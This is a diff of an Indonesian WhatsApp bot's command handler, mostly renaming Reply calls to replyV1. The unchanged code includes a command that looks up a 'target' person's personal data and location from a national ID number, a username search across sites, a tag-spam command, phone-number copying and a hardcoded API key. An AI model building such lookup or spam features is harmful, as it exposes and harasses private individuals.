-        return Reply("𝐒𝐎𝐑𝐑𝐘 𝐋𝐔 𝐉𝐄𝐋𝐄𝐊 𝐉𝐀𝐃𝐈 𝐆𝐀 𝐃𝐀𝐏𝐄𝐓 𝐀𝐊𝐒𝐄𝐒");
+        return replyV1("𝐒𝐎𝐑𝐑𝐘 𝐋𝐔 𝐉𝐄𝐋𝐄𝐊 𝐉𝐀𝐃𝐈 𝐆𝐀 𝐃𝐀𝐏𝐄𝐓 𝐀𝐊𝐒𝐄𝐒");
 
     if (!q)
-        return Reply(
+        return replyV1(
             "📌 Masukkan NIK target!\n\nContoh:\n.nik-perse 3202285909840005"
         );
 
     const nik = q.trim();
 
     try {
-        Reply("🔍 Sedang Mencari Data Dari NIK Tersebut");
+        replyV1("🔍 Sedang Mencari Data Dari NIK Tersebut");
 
         const res = await fetch("https://api.siputzx.my.id/api/tools/nik-checker", {
             method: "POST",
@@ -34980,7 +34953,7 @@ case 'nik-information': {
         const json = await res.json();
 
         if (!json.status || !json.data?.data) {
-            return Reply("❌ NIK tidak valid atau data tidak ditemukan.");
+            return replyV1("❌ NIK tidak valid atau data tidak ditemukan.");
         }
 
         const d = json.data.data;
@@ -35015,18 +34988,18 @@ ${coord.lat && coord.lon
 
         `.trim();
 
-        Reply(hasil);
+        replyV1(hasil);
 
     } catch (err) {
         console.error("NIK PERSE ERROR:", err);
-        Reply("❌ Gagal memproses NIK");
+        replyV1("❌ Gagal memproses NIK");
     }
 }
 
 break;
 
 case "search-username": {
-  if (!q) return Reply("Usernamenya mana. Internet bukan cenayang.");
+  if (!q) return replyV1("Usernamenya mana. Internet bukan cenayang.");
 
   const username = q.trim();
 
@@ -35047,14 +35020,14 @@ case "search-username": {
     teks += `• ${name}: ${url}\n`;
   }
 
-  Reply(teks);
+  replyV1(teks);
 }
 
 break;
 
 //STOOP TOOLSMENU
 case "swdl2": case "getsw": {
-        if (!isOwner) return Reply(mess.owner)
+        if (!isOwner) return replyV1(mess.owner)
         
         if (!m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
         return conn.sendMessage(from, { text: "Reply ke status (story) yang ingin kamu download!" }, { quoted: lol });
@@ -35095,10 +35068,10 @@ case "swdl2": case "getsw": {
     }
     break
     case "copy": {
-    if (!m.isGroup) return Reply("Command ini cuma bisa dipakai di grup 👥");
+    if (!m.isGroup) return replyV1("Command ini cuma bisa dipakai di grup 👥");
 
     // pastikan user membalas pesan
-    if (!quoted || !quoted.sender) return Reply("Reply pesan orang yang ingin di-copy nomornya!");
+    if (!quoted || !quoted.sender) return replyV1("Reply pesan orang yang ingin di-copy nomornya!");
 
     // ambil nomor user yang di-Reply
     let nomor = quoted.sender.split('@')[0];
@@ -35146,7 +35119,7 @@ case "swdl2": case "getsw": {
 }
 break;
 case "copyme": {
-    if (!m.isGroup) return Reply("Command ini cuma bisa dipakai di grup 👥");
+    if (!m.isGroup) return replyV1("Command ini cuma bisa dipakai di grup 👥");
 
     let nomor = m.sender.split('@')[0]; // ambil nomor tanpa @
 
@@ -35195,18 +35168,18 @@ break;
 case 'tag':
 case 'spamtag': {
 if (mess.group) { 
- if (!m.isGroup) return Reply(mess.group) 
+ if (!m.isGroup) return replyV1(mess.group) 
 }
 if (mess.owner) {
-if (!isCreator) return Reply(mess.owner) 
+if (!isCreator) return replyV1(mess.owner) 
 }
 if (mess.admin) {
-if (!isAdmins) return Reply(mess.admjn) 
+if (!isAdmins) return replyV1(mess.admjn) 
 }
-    if (!text) return Reply(`Contoh penggunaan:\n${prefix}tag @agus 10 *(maksimal 50)*`);
+    if (!text) return replyV1(`Contoh penggunaan:\n${prefix}tag @agus 10 *(maksimal 50)*`);
 
     let [mentionText, countText] = text.split(' ');
-    if (!mentionText.startsWith('@')) return Reply('Harus tag user pakai @');
+    if (!mentionText.startsWith('@')) return replyV1('Harus tag user pakai @');
 
     let count = parseInt(countText) || 1;
     if (count > 50) count = 50;
@@ -35218,7 +35191,7 @@ if (!isAdmins) return Reply(mess.admjn)
         return jidNum === mentionText.replace('@', '');
     });
 
-    if (!target) return Reply('User tidak ditemukan di grup!');
+    if (!target) return replyV1('User tidak ditemukan di grup!');
 
     // Kirim pesan
     for (let i = 0; i < count; i++) {
@@ -35232,7 +35205,7 @@ if (!isAdmins) return Reply(mess.admjn)
         );
     }
 
-    Reply(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
+    replyV1(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
 }
 break;
 case "antilink": 
@@ -35248,22 +35221,22 @@ let dbFile = isKick
     : legacyAntiLinkFile;
 
 if (args[0] === "on") {
-    if (linkDB.includes(m.chat)) return Reply(`✅ ${command} sudah aktif!`);
+    if (linkDB.includes(m.chat)) return replyV1(`✅ ${command} sudah aktif!`);
     linkDB.push(m.chat);
     fs.writeFileSync(dbFile, JSON.stringify(linkDB));
         } else if (args[0] === "off") {
-    if (!linkDB.includes(m.chat)) return Reply(`❌ ${command} belum diaktifkan.`);
+    if (!linkDB.includes(m.chat)) return replyV1(`❌ ${command} belum diaktifkan.`);
     linkDB.splice(linkDB.indexOf(m.chat), 1);
     fs.writeFileSync(dbFile, JSON.stringify(linkDB));
-    Reply(`❌ ${command} telah dinonaktifkan!`);
+    replyV1(`❌ ${command} telah dinonaktifkan!`);
 } else {
-            Reply(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
+            replyV1(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
         }
       break
 case 'antilinkig': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
     if (!antiLinkSpecial[m.chat]) {
         antiLinkSpecial[m.chat] = {
             antilinkig: false,
@@ -35275,14 +35248,14 @@ case 'antilinkig': {
     if (status === 'on') {
         antiLinkSpecial[m.chat].antilinkig = true
         saveAntiLinkSpecial()
-        return Reply('✅ *Antilink IG berhasil diaktifkan!*')
+        return replyV1('✅ *Antilink IG berhasil diaktifkan!*')
     }
     if (status === 'off') {
         antiLinkSpecial[m.chat].antilinkig = false
         saveAntiLinkSpecial()
-        return Reply('❌ *Antilink IG berhasil dimatikan!*')
+        return replyV1('❌ *Antilink IG berhasil dimatikan!*')
     }
-    return Reply(
+    return replyV1(
         `*ANTI LINK IG*\n\n` +
         `• ${prefix}antilinkig on\n` +
         `• ${prefix}antilinkig off`
@@ -35290,9 +35263,9 @@ case 'antilinkig': {
 }
 break
 case 'antilinktele': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
     if (!antiLinkSpecial[m.chat]) {
         antiLinkSpecial[m.chat] = {
             antilinkig: false,
@@ -35304,14 +35277,14 @@ case 'antilinktele': {
     if (status === 'on') {
         antiLinkSpecial[m.chat].antilinktele = true
         saveAntiLinkSpecial()
-        return Reply('✅ *Antilink Telegram berhasil diaktifkan!*')
+        return replyV1('✅ *Antilink Telegram berhasil diaktifkan!*')
     }
     if (status === 'off') {
         antiLinkSpecial[m.chat].antilinktele = false
         saveAntiLinkSpecial()
-        return Reply('❌ *Antilink Telegram berhasil dimatikan!*')
+        return replyV1('❌ *Antilink Telegram berhasil dimatikan!*')
     }
-    return Reply(
+    return replyV1(
         `*ANTI LINK TELEGRAM*\n\n` +
         `• ${prefix}antilinktele on\n` +
         `• ${prefix}antilinktele off`
@@ -35319,9 +35292,9 @@ case 'antilinktele': {
 }
 break
 case 'antiwame': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
     if (!antiLinkSpecial[m.chat]) {
         antiLinkSpecial[m.chat] = {
             antilinkig: false,
@@ -35333,14 +35306,14 @@ case 'antiwame': {
     if (status === 'on') {
         antiLinkSpecial[m.chat].antiwame = true
         saveAntiLinkSpecial()
-        return Reply('✅ *Anti Wame berhasil diaktifkan!*')
+        return replyV1('✅ *Anti Wame berhasil diaktifkan!*')
     }
     if (status === 'off') {
         antiLinkSpecial[m.chat].antiwame = false
         saveAntiLinkSpecial()
-        return Reply('❌ *Anti Wame berhasil dimatikan!*')
+        return replyV1('❌ *Anti Wame berhasil dimatikan!*')
     }
-    return Reply(
+    return replyV1(
         `*ANTI WAME*\n\n` +
         `• ${prefix}antiwame on\n` +
         `• ${prefix}antiwame off`
@@ -35355,7 +35328,7 @@ case 'slazada':
 case 'tiktokptv': {
     await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });
 
-    if (!args[0]) return Reply(`❌ Masukkan link TikTok. Contoh: ${prefix + command} https://www.tiktok.com/@user/video/123456789`);
+    if (!args[0]) return replyV1(`❌ Masukkan link TikTok. Contoh: ${prefix + command} https://www.tiktok.com/@user/video/123456789`);
     try {
         // Ambil video TikTok
         let res = await tiktok2(`${args[0]}`);
@@ -35369,7 +35342,7 @@ case 'tiktokptv': {
 
     } catch (err) {
         console.log(err);
-        Reply('Gagal mendownload video, pastikan link TikTok valid');
+        replyV1('Gagal mendownload video, pastikan link TikTok valid');
     }
 }
 break
@@ -35380,18 +35353,18 @@ case 'toptv': {
   const context = m.message?.[type]?.contextInfo
 
   if (!context?.quotedMessage)
-    return Reply('Reply videonya dengan .toptv')
+    return replyV1('Reply videonya dengan .toptv')
 
   const quoted = context.quotedMessage
   const qType = Object.keys(quoted)[0]
 
   if (qType !== 'videoMessage')
-    return Reply('Itu bukan video')
+    return replyV1('Itu bukan video')
 
   const duration = quoted.videoMessage?.seconds || 0
 
   if (duration > 60)
-    return Reply(`❌ Video terlalu panjang (${duration} detik).
+    return replyV1(`❌ Video terlalu panjang (${duration} detik).
 Maksimal 60 detik.`)
 
   // 🔥 DOWNLOAD MEDIA (cara baru)
@@ -35413,10 +35386,10 @@ Maksimal 60 detik.`)
 break
 case 'togif': 
 case 'gif': {
-    if (!quoted) return Reply('Reply videonya dengan caption *.togif*')
+    if (!quoted) return replyV1('Reply videonya dengan caption *.togif*')
     if (!/video/.test(mime)) return m.Eeply('Itu bukan video!')
     
-    Reply('⏳ Sedang mengubah video ke GIF...')
+    replyV1('⏳ Sedang mengubah video ke GIF...')
 
     let media = await quoted.download()
     
@@ -35429,10 +35402,10 @@ case 'gif': {
 }
 break
 case 'remini': {
-if (!m.quoted) return Reply("Reply gambar dengan command .remini")
+if (!m.quoted) return replyV1("Reply gambar dengan command .remini")
 
 let mime = m.quoted.mimetype || ""
-if (!mime.includes("image")) return Reply("Harus reply gambar!")
+if (!mime.includes("image")) return replyV1("Harus reply gambar!")
 
 let media = await conn.downloadAndSaveMediaMessage(m.quoted)
 
@@ -35449,7 +35422,7 @@ caption: "✨ Remini Result"
 }
 break
 case "ttstalk": {
-if (!q) return Reply("Masukkan username TikTok!")
+if (!q) return replyV1("Masukkan username TikTok!")
 
 let res = await fetch(`https://tikwm.com/api/user/info?unique_id=${q}`)
 let json = await res.json()
@@ -35479,7 +35452,7 @@ let res = await fetch("https://tikwm.com/api/feed/list")
 let json = await res.json()
 
 if (!json.data || !json.data.length) {
-return Reply("Tidak bisa mengambil video trending")
+return replyV1("Tidak bisa mengambil video trending")
 }
 
 let vid = json.data[0]
@@ -35494,20 +35467,20 @@ caption: `🔥 *TikTok Trending*
 
 } catch (err) {
 console.log(err)
-Reply("Terjadi error saat mengambil data TikTok")
+replyV1("Terjadi error saat mengambil data TikTok")
 }
 
 }
 break
 //website
 case "delweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text) return Reply('📌 Contoh:\n.delweb namaproject')
-    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text) return replyV1('📌 Contoh:\n.delweb namaproject')
+    if (!global.vercelToken) return replyV1('❌ Token Vercel belum diset!')
 
     const webName = text.trim().toLowerCase()
 
-    let msg = await Reply(`⏳ Menghapus *${webName}*...`)
+    let msg = await replyV1(`⏳ Menghapus *${webName}*...`)
 
     try {
         let res = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
@@ -35544,12 +35517,12 @@ case "delweb": {
 }
 break;
 case "gethtml": {
-    if (!isCreator) return Reply(mess.owner);
-    if (!text) return Reply("❗ Masukkan domain atau URL");
+    if (!isCreator) return replyV1(mess.owner);
+    if (!text) return replyV1("❗ Masukkan domain atau URL");
 
     try {
         let res = await fetch(text);
-        if (!res.ok) return Reply("❌ Gagal mengambil data dari URL tersebut");
+        if (!res.ok) return replyV1("❌ Gagal mengambil data dari URL tersebut");
         let html = await res.text();
 
         // pastikan folder ada
@@ -35568,13 +35541,13 @@ case "gethtml": {
         fs.unlinkSync(filePath); // hapus setelah terkirim
     } catch (e) {
         console.error(e);
-        Reply("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
+        replyV1("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
     }
 }
 break;
 case "listweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!global.vercelToken) return replyV1('❌ Token Vercel belum diset!')
 
     try {
         let res = await fetch('https://api.vercel.com/v9/projects', {
@@ -35586,7 +35559,7 @@ case "listweb": {
         let json = await res.json()
 
         if (!json.projects || json.projects.length === 0) {
-            return Reply('📭 Tidak ada website!')
+            return replyV1('📭 Tidak ada website!')
         }
 
         let teks = `🌐 *LIST WEBSITE XnalzNotDev*\n\n`
@@ -35596,18 +35569,18 @@ case "listweb": {
             teks += `🔗 https://${v.name}.vercel.app\n\n`
         })
 
-        Reply(teks)
+        replyV1(teks)
 
     } catch (e) {
         console.log(e)
-        Reply('❌ Gagal mengambil data!')
+        replyV1('❌ Gagal mengambil data!')
     }
 }
 break;
 case "infoweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text) return Reply('📌 Contoh:\n.infoweb namaproject')
-    if (!global.vercelToken) return Reply('❌ Token belum diset!')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text) return replyV1('📌 Contoh:\n.infoweb namaproject')
+    if (!global.vercelToken) return replyV1('❌ Token belum diset!')
 
     const webName = text.trim().toLowerCase()
 
@@ -35620,7 +35593,7 @@ case "infoweb": {
 
         // ❌ kalau project gak ada / udah dihapus
         if (res.status === 404) {
-            return Reply(`⚠️ *${webName}* tidak ditemukan / sudah dihapus!`)
+            return replyV1(`⚠️ *${webName}* tidak ditemukan / sudah dihapus!`)
         }
 
         let json = await res.json()
@@ -35632,7 +35605,7 @@ case "infoweb": {
             if (cek.status === 200) statusWeb = "✅ Online"
         } catch {}
 
-        Reply(`📊 *INFO WEB XnalzNotDev*
+        replyV1(`📊 *INFO WEB XnalzNotDev*
 
 📦 Nama: ${json.name}
 🆔 ID: ${json.id}
@@ -35642,13 +35615,13 @@ case "infoweb": {
         
     } catch (e) {
         console.log(e)
-        Reply('❌ Gagal ambil info!')
+        replyV1('❌ Gagal ambil info!')
     }
 }
 break;
 case "cekweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text) return Reply('📌 Contoh:\n.cekweb namaproject')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text) return replyV1('📌 Contoh:\n.cekweb namaproject')
 
     const webName = text.trim().toLowerCase()
     const url = `https://${webName}.vercel.app`
@@ -35657,19 +35630,19 @@ case "cekweb": {
         let res = await fetch(url)
 
         if (res.status === 200) {
-            Reply(`🌐 *CEK WEBSITE*
+            replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ⚡ Status: ✅ Online`)
         } else {
-            Reply(`🌐 *CEK WEBSITE*
+            replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ⚠️ Status: ❌ Tidak normal (${res.status})`)
         }
 
     } catch (e) {
-        Reply(`🌐 *CEK WEBSITE*
+        replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ❌ Status: Offline / Tidak bisa diakses`)
@@ -35677,8 +35650,8 @@ case "cekweb": {
 }
 break;
 case "historyweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!global.vercelToken) return Reply('❌ Token belum diset!')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!global.vercelToken) return replyV1('❌ Token belum diset!')
 
     try {
         let res = await fetch('https://api.vercel.com/v6/deployments', {
@@ -35697,22 +35670,22 @@ case "historyweb": {
             teks += `🌐 https://${v.url}\n\n`
         })
 
-        Reply(teks)
+        replyV1(teks)
 
     } catch (e) {
-        Reply('❌ Gagal ambil history')
+        replyV1('❌ Gagal ambil history')
     }
 }
 break;
 case "deployweb": {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text) return Reply('📌 Contoh:\n.deployweb XnalzNotDev-web')
-    if (!m.quoted) return Reply('❗ Reply file .zip / .html')
-    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text) return replyV1('📌 Contoh:\n.deployweb XnalzNotDev-web')
+    if (!m.quoted) return replyV1('❗ Reply file .zip / .html')
+    if (!global.vercelToken) return replyV1('❌ Token Vercel belum diset!')
 
     const qmsg = m.quoted
     const mime = qmsg.mimetype || qmsg.msg?.mimetype || ''
-    if (!/zip|html/.test(mime)) return Reply('❌ Format harus .zip / .html')
+    if (!/zip|html/.test(mime)) return replyV1('❌ Format harus .zip / .html')
 
     const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
 
@@ -35812,7 +35785,7 @@ case "deployweb": {
 break;
 case 'carivt':
 case 'ttsearch': {
-if (!q) return Reply("Masukkan kata kunci!")
+if (!q) return replyV1("Masukkan kata kunci!")
 
 let res = await fetch(`https://api.agatz.xyz/api/tiktoksearch?message=${q}`)
 let data = await res.json()
@@ -35829,10 +35802,10 @@ break
 // Case untuk menampilkan list produk
 case "lisproduk":
 case "listproduk": {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     
     if (!global.listProduk || global.listProduk.length === 0)
-        return Reply("⚠️ Belum ada daftar produk. Silakan set di setting.js dulu.")
+        return replyV1("⚠️ Belum ada daftar produk. Silakan set di setting.js dulu.")
     
     let teks = `📋 *Daftar Produk Saat Ini:*\n\n${global.listProduk.map((p, i) => `${i+1}. ${p}`).join("\n")}`
     
@@ -35841,8 +35814,8 @@ case "listproduk": {
 }
 break
 case "done": {
-if (!isCreator) return Reply(mess.owner)
-if (!q) return Reply(example("jasa install panel"))
+if (!isCreator) return replyV1(mess.owner)
+if (!q) return replyV1(example("jasa install panel"))
 let teks = `📦 ${text}
 ⏰ ${tanggal(Date.now())}
 
@@ -35862,8 +35835,8 @@ sourceUrl: linkSaluran,
 break
 case "prosses":
 case "proses": {
-if (!isCreator) return Reply(mess.owner)
-if (!q) return Reply(example("jasa install panel"))
+if (!isCreator) return replyV1(mess.owner)
+if (!q) return replyV1(example("jasa install panel"))
 let teks = `📦 ${text}
 ⏰ ${tanggal(Date.now())}
 
@@ -35885,7 +35858,7 @@ case 'tiktok':
 case 'tt': {
     const inputUrl = String(args[0] || '').trim();
     if (!inputUrl) {
-        return Reply(
+        return replyV1(
             '🎬 *TIKTOK DOWNLOADER*\n\n' +
             'Kirim link TikTok untuk memilih format unduhan.\n\n' +
             'Contoh:\n.tiktok https://vt.tiktok.com/xxxx'
@@ -35896,12 +35869,12 @@ case 'tt': {
     try {
         parsedTikTokUrl = new URL(inputUrl);
     } catch {
-        return Reply('❌ Link TikTok tidak valid. Kirim URL lengkap yang diawali https://.');
+        return replyV1('❌ Link TikTok tidak valid. Kirim URL lengkap yang diawali https://.');
     }
     const tikTokHost = String(parsedTikTokUrl.hostname || '').toLowerCase().replace(/^www\./, '');
     if (!['http:', 'https:'].includes(parsedTikTokUrl.protocol) ||
         !(tikTokHost === 'tiktok.com' || tikTokHost.endsWith('.tiktok.com'))) {
-        return Reply('❌ Link harus berasal dari TikTok, misalnya https://www.tiktok.com/... atau https://vt.tiktok.com/...');
+        return replyV1('❌ Link harus berasal dari TikTok, misalnya https://www.tiktok.com/... atau https://vt.tiktok.com/...');
     }
 
     await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
@@ -35947,7 +35920,7 @@ case 'tt': {
         // TikTok Photo Mode is handled by the existing slide downloader.
         if (!res.no_watermark && !res.no_watermark_hd && !res.watermark && Array.isArray(res.images) && res.images.length) {
             await conn.sendMessage(m.chat, { react: { text: '📸', key: m.key } }).catch(() => {});
-            return Reply('📸 Ini TikTok Photo/Slide. Gunakan *.tiktokslide* untuk mengunduh fotonya.');
+            return replyV1('📸 Ini TikTok Photo/Slide. Gunakan *.tiktokslide* untuk mengunduh fotonya.');
         }
         if (!res.no_watermark_hd && !res.no_watermark && !res.watermark) {
             throw new Error('Tautan video tidak ditemukan. Pastikan postingan TikTok bersifat publik.');
@@ -35989,7 +35962,7 @@ case 'tt': {
     } catch (err) {
         console.error('[TIKTOK MENU ERROR]', err?.stack || err);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-        return Reply(`❌ Gagal menyiapkan unduhan TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 240)}`);
+        return replyV1(`❌ Gagal menyiapkan unduhan TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 240)}`);
     }
 }
 break
@@ -35997,9 +35970,9 @@ break
 case 'ttvideo':
 case 'tiktokvideo': {
     const resolved = getTikTokDownloadSelection(args[0], m.sender, m.chat);
-    if (resolved.error) return Reply(`⚠️ ${resolved.error}`);
+    if (resolved.error) return replyV1(`⚠️ ${resolved.error}`);
     const { selection, token } = resolved;
-    if (selection.processing) return Reply('⏳ Pilihan ini sedang diproses. Tunggu sampai unduhan selesai.');
+    if (selection.processing) return replyV1('⏳ Pilihan ini sedang diproses. Tunggu sampai unduhan selesai.');
 
     selection.processing = true;
     await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
@@ -36057,7 +36030,7 @@ case 'tiktokvideo': {
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
     } catch (err) {
         console.error('[TIKTOK VIDEO DOWNLOAD ERROR]', err?.stack || err);
-        return Reply(`❌ Gagal mengunduh video TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 220)}\nPilihan masih aktif agar kamu bisa mencoba lagi.`);
+        return replyV1(`❌ Gagal mengunduh video TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 220)}\nPilihan masih aktif agar kamu bisa mencoba lagi.`);
     } finally {
         selection.processing = false;
     }
@@ -36067,9 +36040,9 @@ break
 case 'ttaudio':
 case 'tiktokaudio': {
     const resolved = getTikTokDownloadSelection(args[0], m.sender, m.chat);
-    if (resolved.error) return Reply(`⚠️ ${resolved.error}`);
+    if (resolved.error) return replyV1(`⚠️ ${resolved.error}`);
     const { selection, token } = resolved;
-    if (selection.processing) return Reply('⏳ Pilihan ini sedang diproses. Tunggu sampai unduhan selesai.');
+    if (selection.processing) return replyV1('⏳ Pilihan ini sedang diproses. Tunggu sampai unduhan selesai.');
 
     selection.processing = true;
     await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
@@ -36091,7 +36064,7 @@ case 'tiktokaudio': {
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
     } catch (err) {
         console.error('[TIKTOK AUDIO DOWNLOAD ERROR]', err?.stack || err);
-        return Reply(`❌ Gagal mengunduh audio TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 220)}\nPilihan masih aktif agar kamu bisa mencoba lagi.`);
+        return replyV1(`❌ Gagal mengunduh audio TikTok.\n\nDetail: ${String(err?.message || err).slice(0, 220)}\nPilihan masih aktif agar kamu bisa mencoba lagi.`);
     } finally {
         selection.processing = false;
     }
@@ -36099,19 +36072,19 @@ case 'tiktokaudio': {
 break
 
 case 'cuaca': case 'cekcuaca': {
-				if (!text) return Reply(`Example: ${prefix + command} jakarta`)
+				if (!text) return replyV1(`Example: ${prefix + command} jakarta`)
 				try {
 					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
-					Reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
+					replyV1(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
 				} catch (e) {
-					Reply('Kota Tidak Di Temukan!')
+					replyV1('Kota Tidak Di Temukan!')
 				}
 			}
 			break
 
 case "ttmp3": case "tiktokmp3": {
     try {
-        if (!text) return Reply(`*Contoh: ${usedPrefix + command} https://vt.tiktok.com/...*`);
+        if (!text) return replyV1(`*Contoh: ${usedPrefix + command} https://vt.tiktok.com/...*`);
 
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 
@@ -36142,7 +36115,7 @@ case "ttmp3": case "tiktokmp3": {
         }
 
         if (!audioUrl) {
-            return Reply('🍂 *Audio TikTok tidak ditemukan*');
+            return replyV1('🍂 *Audio TikTok tidak ditemukan*');
         }
 
         await conn.sendMessage(
@@ -36155,7 +36128,7 @@ case "ttmp3": case "tiktokmp3": {
         );
 
     } catch (e) {
-        await Reply(`🍂 *Terjadi kesalahan*\n${e.message}`);
+        await replyV1(`🍂 *Terjadi kesalahan*\n${e.message}`);
     } finally {
         await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
     }
@@ -36164,24 +36137,24 @@ break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
  case "public": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 conn.public = true
 if (conn.__xeryuuRole !== 'JADIBOT') {
     global.db.settings.whatsappMode = 'public'
     saveDB(global.db)
 }
-return Reply("✅ Mode bot diubah menjadi *PUBLIC*. Semua pengguna dapat menggunakan bot.")
+return replyV1("✅ Mode bot diubah menjadi *PUBLIC*. Semua pengguna dapat menggunakan bot.")
 }
 break       
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "tt2": case "tiktok2": {
-if (!text) return Reply(example("url"))
-if (!text.startsWith("https://")) return Reply(example("url"))
+if (!text) return replyV1(example("url"))
+if (!text.startsWith("https://")) return replyV1(example("url"))
 await tiktokDl(q).then(async (result) => {
 await conn.sendMessage(m.chat, {react: {text: '📥', key: m.key}})
-if (!result.status) return Reply("Error")
+if (!result.status) return replyV1("Error")
 if (result.durations == 0 && result.duration == "0 Seconds") {
 let araara = new Array()
 let urutan = 0
@@ -36230,29 +36203,29 @@ break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case "tobase64": {
-    if (!text) return Reply("Masukan Text!")
+    if (!text) return replyV1("Masukan Text!")
 
     let result = Buffer.from(text).toString('base64')
 
-    Reply(`✅ Hasil Base64:\n\n${result}`)
+    replyV1(`✅ Hasil Base64:\n\n${result}`)
 }
 break;
 case 'saham':
 case 'sahamindo': {
     const symbolInput = String(text || args?.[0] || '').trim().split(/\s+/)[0]
-    if (!symbolInput) return Reply(`Contoh: ${prefix + command} BBCA\nKode lain: BBRI, BMRI, TLKM, ASII`)
+    if (!symbolInput) return replyV1(`Contoh: ${prefix + command} BBCA\nKode lain: BBRI, BMRI, TLKM, ASII`)
     try {
         const quote = await indonesiaTools.getIndonesianStockQuote(symbolInput)
-        await Reply(indonesiaTools.formatStockQuote(quote))
+        await replyV1(indonesiaTools.formatStockQuote(quote))
     } catch (error) {
-        await Reply(`❌ Gagal mengambil harga saham Indonesia.\n${String(error?.message || error).slice(0, 240)}`)
+        await replyV1(`❌ Gagal mengambil harga saham Indonesia.\n${String(error?.message || error).slice(0, 240)}`)
     }
 }
 break
 
 case 'cekplat':
 case 'cekplatnomor': {
-    if (!text?.trim()) return Reply(`Contoh: ${prefix + command} B 1234 XYZ`)
+    if (!text?.trim()) return replyV1(`Contoh: ${prefix + command} B 1234 XYZ`)
     const plate = indonesiaTools.parseIndonesianPlate(text)
     const details = [
         '🚘 *PEMERIKSAAN FORMAT PLAT*',
